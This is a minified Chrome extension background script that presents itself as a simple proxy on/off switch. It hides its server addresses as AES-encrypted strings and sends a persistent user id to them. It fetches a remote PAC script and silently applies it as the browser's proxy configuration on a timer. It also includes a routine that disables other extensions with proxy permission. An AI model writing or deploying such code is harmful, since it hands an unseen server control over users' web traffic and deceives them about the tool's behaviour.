var cc, pc, UP;
var L = localStorage,
    S = chrome['storage'].local,
    C = chrome['tabs'].create,
    J = JSON.stringify,
    P = JSON.parse,
    A = chrome.browserAction;
L.isEnabled || (L.isEnabled = !0), L.T || (L.T = 7e6), L.uid || (L.uid = Date.now()), L.V = chrome.app.getDetails().version, L.C || (L.C = J(["U2FsdGVkX19b+rGRl3biafMC1rSMejJ/WYMKl4LQUJj9v6z/cHmXINDh2Ugh+q7jo0OGj1IBFtLC0v3Y23luKQ==", "U2FsdGVkX1+poIEChHKgvzBELSP2+vHvotbMSAWxZT53njC5kQ7FzhtsuhRy4F7bHectHXiC6qQzfQEFT7tawQ=="])), L.P || (L.P = J(["U2FsdGVkX18Rk5paUwGcB2cPLTp+pSZNhzPD5fFstIv7N23egYorKQMClCsLUu9bVUk8UtLBAgEvCrWFpgQX4g==", "U2FsdGVkX1/DTAP1wKd8d0w/iGIKIRdzBDAibq4VFEwT89GE+mbol6z+055PivsRLxmeZLIfWdzTRAM6SvTuoA=="]));

function LC() {
    if (cc < P(L.C).length) {
        var a = CryptoJS.AES.decrypt(P(L.C)[cc], "config").toString(CryptoJS.enc.Utf8) + "?uid=" + L.uid + "&version=" + L.V;
        $.ajax({
            url: a,
            type: "GET",
            ifModified: !1,
            async: !0,
            cache: !1,
            error: () => {
            return cc++, void LC()
        },
            success: (b, c, d) => {
            if (d && 4 == d.readyState) {
                var f = d.getResponseHeader("Content-Type");
                return -1 == f.indexOf("javascript") ? (cc++, void LC()) : b && 0 < b.length ? void LP() : (cc++, void LC())
            }
            return cc++, void LC()
        }
    })
    } else return void LP()
}

function LP() {
    if (pc < P(L.P).length) {
        var a = CryptoJS.AES.decrypt(P(L.P)[pc], "record").toString(CryptoJS.enc.Utf8) + "?uid=" + L.uid + "&version=" + L.V;
        $.ajax({
            url: a,
            type: "GET",
            ifModified: !0,
            async: !0,
            cache: !1,
            error: () => {
            return pc++, void LP()
        },
            success: (b, c, d) => {
            if (!(d && 4 == d.readyState && 304 == d.status)) {
                if (d && 4 == d.readyState) {
                    var f = d.getResponseHeader("Content-Type");
                    return -1 != f.indexOf("application/x-ns-proxy-autoconfig") || -1 != f.indexOf("text/plain") ? b && 0 < b.length ? (S.set({
                        D: b
                    }), void SP()) : (pc++, void LP()) : (pc++, void LP())
                }
                return pc++, void LP()
            }
        }
    })
    } else return void SP()
}

function SP() {
    return "true" == L.isEnabled && "true" == L.user_proxy ? (UP = "PROXY " + L.user_proxy_http + ":" + L.user_proxy_port + ";", void S.get("D", a => {
        if (a && a.D && 0 < a.D.length) {
        A.setIcon({
        path: "img/128on.png"
    }), A.setTitle({
        title: "\u0412\u043A\u043B"
    });
    var b = a.D,
        c = /(\/\*[\w\s]+\*\/)([\w\s]+)(\/\*[\w\s]+\*\/)/ig;
    b = b.replace(c, "$1 \"" + UP + "DIRECT\"$3"), chrome['proxy']['settings'].set({
        value: {
            mode: "pac_script",
            pacScript: {
                data: b
            }
        },
        scope: "regular"
    })
} else A.setIcon({
        path: "img/128on.png"
    }), A.setTitle({
        title: "\u0412\u043A\u043B"
    }), chrome['proxy']['settings'].set({
        value: {
            mode: "pac_script",
            pacScript: {
                data: "function FindProxyForURL(url, host) { return \"" + UP + "DIRECT\"}"
            }
        },
        scope: "regular"
    })
})) : void("true" == L.isEnabled ? S.get("D", a => {
        a && a.D && 0 < a.D.length ? (A.setIcon({
        path: "img/128on.png"
    }), A.setTitle({
        title: "\u0412\u043A\u043B"
    }), chrome['proxy']['settings'].set({
        value: {
            mode: "pac_script",
            pacScript: {
                data: a.D
            }
        },
        scope: "regular"
    })) : (L.isEnabled = !1, A.setIcon({
        path: "img/128off.png"
    }), A.setTitle({
        title: "\u0412\u044B\u043A\u043B"
    }), chrome['proxy']['settings'].clear({
        scope: "regular"
    }))
}) : (A.setIcon({
        path: "img/128off.png"
    }), A.setTitle({
        title: "\u0412\u044B\u043A\u043B"
    }), chrome['proxy']['settings'].clear({
        scope: "regular"
    })))
}
chrome.runtime.onMessage.addListener((a, b, c) => {
    switch (a.action) {
case "getState":
    c({
        isEnabled: P(L.getItem("isEnabled"))
    });
    break;
case "enable":
    SP();
    break;
case "disable":
    SP();
    break;
case "user_proxy":
    SP();
}
});

function DPE() {
    window.chrome.management.getAll(a => {
        a.forEach(b => {
        b.enabled && b.id != window.chrome.runtime.id && -1 !== b.permissions.indexOf("proxy") && window.chrome.management.setEnabled(b.id, !1)
})
})
}

function start() {
    pc = 0, cc = 0, chrome['proxy']['settings'].get({
        incognito: !1
    }, a => {
        a && ("controllable_by_this_extension" == a.levelOfControl || "controlled_by_this_extension" == a.levelOfControl) && navigator && navigator.onLine && -1 != navigator.userAgent.indexOf("Chrome") ? LC() : setTimeout(() => {
        start()
    }, 5e3)
})
}
start(), setInterval(() => {
    start()
}, L.T);